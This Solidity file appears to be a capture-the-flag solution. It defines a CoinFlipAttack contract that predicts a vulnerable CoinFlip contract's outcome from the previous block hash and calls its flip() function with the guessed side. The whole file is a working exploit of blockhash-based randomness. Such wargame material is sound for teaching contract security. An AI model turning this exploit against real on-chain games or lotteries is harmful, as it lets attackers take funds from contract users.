// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

/*
Import the vulnerable contract so we can later
instantiate it and call its functions
*/

// import "./CoinFlip.sol";
interface CoinFlip_I {
    function flip(bool _guess) external returns (bool);
}

import "./SafeMath.sol";

contract CoinFlipAttack {
    using SafeMath for uint256;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    address public victim;

    function setVictim(address _victim) public {
        victim = _victim;
    }

    function hackFlip() public {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;

        CoinFlip_I(victim).flip(side);
    }
}
